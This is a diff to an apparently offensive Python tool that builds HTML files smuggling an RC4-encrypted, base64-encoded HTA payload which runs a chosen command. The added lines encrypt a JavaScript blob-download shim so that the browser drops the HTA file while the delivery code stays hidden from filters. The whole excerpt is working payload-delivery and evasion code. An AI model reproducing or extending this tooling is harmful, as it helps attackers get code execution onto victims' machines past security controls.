@@ -109,7 +109,23 @@ if __name__ == '__main__':
         hta_text = PAYLOAD_OPTIONS.get(args.payload).format(args.command, rand=rnd())
         hta_encrypted = base64.b64encode(rc4(args.key, hta_text))
         filename_encrypted = base64.b64encode(rc4(args.key, args.output))
-        msSaveBlob = base64.b64encode(rc4(args.key, "navigator.msSaveBlob"))
+        blobShim = """(function (blob,fname) {
+if (window.navigator.msSaveOrOpenBlob)  // IE hack; see http://msdn.microsoft.com/en-us/library/ie/hh779016.aspx
+    window.navigator.msSaveBlob(blob, fname);
+else
+{
+    var a = window.document.createElement("a");
+    a.href = window.URL.createObjectURL(blob, {type: "text/plain"});
+    a.download = fname;
+    document.body.appendChild(a);
+    a.click();  // IE: "Access is denied"; see: https://connect.microsoft.com/IE/feedback/details/797361/ie-10-treats-blob-url-as-cross-origin-and-denies-access
+    document.body.removeChild(a);
+    // blobShim borrowed from https://github.com/mholt/PapaParse/issues/175#issuecomment-75597039
+}})
+"""
+
+        msSaveBlob = base64.b64encode(rc4(args.key, blobShim))
+
         blob = base64.b64encode(rc4(args.key, "Blob"))
 
         outfile = "{}.html".format(os.path.splitext(args.output)[0])
